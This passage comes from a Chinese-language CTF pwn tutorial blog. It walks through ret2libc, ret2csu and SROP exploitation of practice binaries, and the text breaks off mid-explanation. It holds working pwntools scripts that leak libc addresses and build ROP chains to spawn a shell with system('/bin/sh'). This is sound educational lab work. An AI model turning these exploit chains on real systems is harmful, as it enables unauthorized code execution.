class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_rsi_r15_addr),</span><br><span class="line">        p64(elf.got[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.plt[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(pop_rbp_addr),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.symbols[<span class="string">&quot;main&quot;</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">addr = u64(io.recvline()[:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;============&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(addr)</span><br><span class="line"><span class="built_in">print</span>(libc.symbols[<span class="string">&quot;write&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;============&quot;</span>)</span><br><span class="line">offset = addr - libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) + offset),</span><br><span class="line">        p64(libc.symbols[<span class="string">&quot;system&quot;</span>] + offset),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>具体区别就是我这里接收了输出，第二次我只需要截取前8位即可。然后就是偏移，libc直接计算即可。</p><h1 id="进阶栈溢出"><a href="#进阶栈溢出" class="headerlink" title="进阶栈溢出"></a>进阶栈溢出</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="漏洞实现"><a href="#漏洞实现" class="headerlink" title="漏洞实现"></a>漏洞实现</h3><p>在64位程序中，只要是引用了libc.so就会有csu相关的代码，有一个<code>__libc_csu_init</code>函数，具体作用是给libc做初始化，他具体执行的内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250516191757.png"><br>重点在于后面两个框出来的位置，在第一个中它通过r15、r14、r13分别给rdx、rsi、edi进行传参数，相当于控制了一个函数调用的前3个变量，紧接着就直接执行了call，但是call的位置有点说法，他call的是<code>r12+rbx*8</code>位置的函数，我们如果想要利用基本就要把rbx控制为0，让其直接调用r12寄存器中的内容。在第二个函数中它通过栈中的数据给rbx、rbp、r12、r13、r14、r15赋了值，然后最后进行了ret。我们只要造成了栈溢出并且可以做到控制一个执行流，我们就可以通过这个做到任意函数调用，当然调用的前提我们需要算出函数的迁移。具体的攻击流程就是通过loc_400606从栈中拿数据，要重点控制的寄存器是rbx、r12-15，然后再ret的时候ret到loc_4005F0中，这样就可以直接去执行我们构造的call。除函数外，rbx需要重点控制，他最好设置成0，不然call的位置会比较难找。还有就是当前第二个他是通过<code>mov</code>6个基于rsp的偏移位置给寄存器值，最后给rsp+了38h的位置其实这里就可以理解为每一条mov都是在pop，有些版本的这里会直接显示pop，没有<code>add rsp,38h</code>。</p><h3 id="题目来源-8"><a href="#题目来源-8" class="headerlink" title="题目来源"></a>题目来源</h3><p>题目下载： <a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5</a><br>题目来源： <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_2">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_2</a></p><h3 id="文件类型-8"><a href="#文件类型-8" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/TEMP/新建文件夹]</span><br><span class="line">└─# file level5</span><br><span class="line">level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=d9f08d31d3b1e53bf52a4206c99f0ad5b61541f6, not stripped</span><br></pre></td></tr></table></figure><p>64位，动态链接</p><h3 id="软件防护-6"><a href="#软件防护-6" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/TEMP/新建文件夹]</span><br><span class="line">└─# checksec level5</span><br><span class="line">[*] <span class="string">&#x27;/mnt/e/TEMP/新建文件夹/level5&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>没开pie，没有金丝雀、就开了一个nx，很常规的防护，很显然这就是要用栈溢出进行攻击</p><h3 id="IDA分析-8"><a href="#IDA分析-8" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数中的内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xDu</span>LL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没什么重点内容，主要是<code>vulnerable_function</code>函数，内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就直接是一个栈溢出漏洞，其他的基本没内容，但是在函数列表中找到了<code>__libc_csu_init</code>。然后还在bss中找到了一块可以用的位置<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250516200746.png"></p><h3 id="攻击思路-8"><a href="#攻击思路-8" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>这个题目是没有libc的我们需要通过csu构造一个write，输出某个函数的地址，计算偏移，然后继续通过csu构造一个read，写入一个sh，然后再次构造一个csu把binsh写入bss中，最后再次通过csu执行system拿bash。</p><h3 id="攻击脚本-6"><a href="#攻击脚本-6" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">io = process(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line"></span><br><span class="line">rdx_rsi_edi_call = <span class="number">0x4005F0</span></span><br><span class="line"></span><br><span class="line">rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400564</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">arg1, arg2, arg3, call</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">b&quot;\x00&quot;</span> * <span class="number">136</span>,</span><br><span class="line">            p64(rbx_rbp_r12_r13_r14_r15_ret),</span><br><span class="line">            p64(<span class="number">0</span>),  <span class="comment"># 补38-30</span></span><br><span class="line">            p64(<span class="number">0</span>),  <span class="comment"># rbx 最好是0</span></span><br><span class="line">            p64(<span class="number">1</span>),  <span class="comment"># rbp 下面内容中他必须为1才不会重复的去循环</span></span><br><span class="line">            p64(call),  <span class="comment"># r12 call</span></span><br><span class="line">            p64(arg1),  <span class="comment"># 13  rdi</span></span><br><span class="line">            p64(arg2),  <span class="comment"># r14 rsi</span></span><br><span class="line">            p64(arg3),  <span class="comment"># r15 rdx</span></span><br><span class="line">            p64(rdx_rsi_edi_call),  <span class="comment"># ret</span></span><br><span class="line">            <span class="string">b&quot;\x00&quot;</span> * <span class="number">56</span>,  <span class="comment"># 需要步38H即56</span></span><br><span class="line">            p64(main_addr),</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span>, payload)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello, World\n&quot;</span>)</span><br><span class="line"><span class="comment"># 第一次让其返回write的地址，用来计算偏移</span></span><br><span class="line">csu(<span class="number">1</span>, elf.got[<span class="string">&quot;write&quot;</span>], <span class="number">8</span>, elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write:&quot;</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里可以使用libcsearch</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">offset = write_addr - libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移计算好写入binsh和system地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello, World\n&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>, bss_addr, <span class="number">16</span>, elf.got[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">sys_addr = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.send(flat([p64(sys_addr), <span class="string">b&quot;/bin/sh\0&quot;</span>]))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用刚才写入的system</span></span><br><span class="line">csu(bss_addr + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, bss_addr)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="漏洞实现-1"><a href="#漏洞实现-1" class="headerlink" title="漏洞实现"></a>漏洞实现</h3><p>SROP的S是指signal机制，触发软中断信号，或者软中断的时候触发。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250511202230.png"></p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<img src="https://image.boychai.xyz/article/Pasted%20image%2020250511202258.png">对于 signal Frame 来说，会因为架构的不同而有所区别，后面会分别给出 x86 以及 x64 的 sigcontext。</li><li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li></ol><p>上面这个过程是从CTFWIKI中复制的，我是没有完全的读懂，但是说白了，出现signal机制的时候会把寄存器全都压入栈中，这个机制触发之后会从栈中恢复数据到寄存器中，如果在恢复的时候把压入栈的数据给覆盖掉，那么在他触发之后恢复的时候就会直接修改寄存器的内容，这个就很厉害了，寄存器全都能控制，威力很大了。然后x86的压栈和恢复结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>x64的结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这俩结构不需要去刻意的去记，在pwntools有现成的对象可以直接转换。需要注意的是想要实现SROP攻击必须要具备下面几个条件</p><ul><li>可以通过栈溢出来控制栈的内容</li><li>需要知道binsh的地址</li><li>可以触发signal系统调用<br>下面看一道例题。</li></ul><h3 id="题目来源-9"><a href="#题目来源-9" class="headerlink" title="题目来源"></a>题目来源</h3><p>这里以 360 春秋杯中的 smallest-pwn 为例进行简单介绍。<br>下载地址： <a href="https://github.com/bjrjk/pwn-learning/blob/main/ROP/SROP/360chunqiu2017_smallest/smallest">https://github.com/bjrjk/pwn-learning/blob/main/ROP/SROP/360chunqiu2017_smallest/smallest</a></p><h3 id="文件类型-9"><a href="#文件类型-9" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/smallest]</span><br><span class="line">└─# file smallest</span><br><span class="line">smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>是一个64位的静态文件</p><h3 id="软件防护-7"><a href="#软件防护-7" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/smallest]</span><br><span class="line">└─# checksec smallest</span><br><span class="line">[*] <span class="string">&#x27;/mnt/e/CTF例题/PWN/smallest/smallest&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>NX是开启的，栈内不能执行。</p><h3 id="IDA分析-9"><a href="#IDA分析-9" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>ida中的反编译出来的内容也很简单，没有C代码只有这几行汇编，其他的啥也没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br></pre></td></tr></table></figure><h3 id="攻击思路-9"><a href="#攻击思路-9" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>其实就这点内容有用的内容全ida中，就只是几行汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h</span><br><span class="line">mov     rsi, rsp</span><br><span class="line">mov     rdi, rax</span><br><span class="line">syscall</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>触发系统调用的参数分别如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX = 0</span><br><span class="line">RDI = 0</span><br><span class="line">RSI = RSP</span><br><span class="line">RDX = 400</span><br></pre></td></tr></table></figure><p>相当于调用了下面的内容，0是标准输入即从屏幕输入，然后写入RSP寄存器的位置即栈顶，写入400个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_read(0,RSP,400)</span><br></pre></td></tr></table></figure><p>我们这里直接 往rsp中写入数据，并且他没有继续操控栈数据，我们就可以不需要计算的直接往RSP写入返回地址，他会直接去执行我们写入位置的代码。这类题目基本就是SROP了，后面会说一下做题可能会遇到的一些疑问。他这里往rsp中读取数据，我们直接写入3个<code>0x4000B0</code>,<code>ret</code>的时候会直接跳转到这里，然后如果正常的输出就会重复运行3次当前的程序，当<code>ret</code>之后的战是这样的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250514141852.png"><br>进入第一个输入<code>0x4000B0</code>，也就是从头执行，这次我们要控制执行流从<code>0x4000BB</code>开始执行，也可以从<code>0x4000B3</code>开始，目的是为了跳过最开始的<code>xor rax,rax</code>指令，因为这个指令会清除rax，此时输入数据<code>0xBB</code>他就会覆盖RSP的前两位，让<code>0x4000B0</code>变成<code>0x4000BB</code>,并且这一次syscall结束之后<code>rax</code>会变成1，然后<code>ret</code>会直接到<code>0x4000BB</code>，<code>rax</code>变成1的原因是rax会存储系统调用的返回值，<code>sys_read</code>的返回值是输入数据的长度，第二次syscall的时候寄存器参数如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX = 1</span><br><span class="line">RDI = 0</span><br><span class="line">RSI = RSP</span><br><span class="line">RDX = 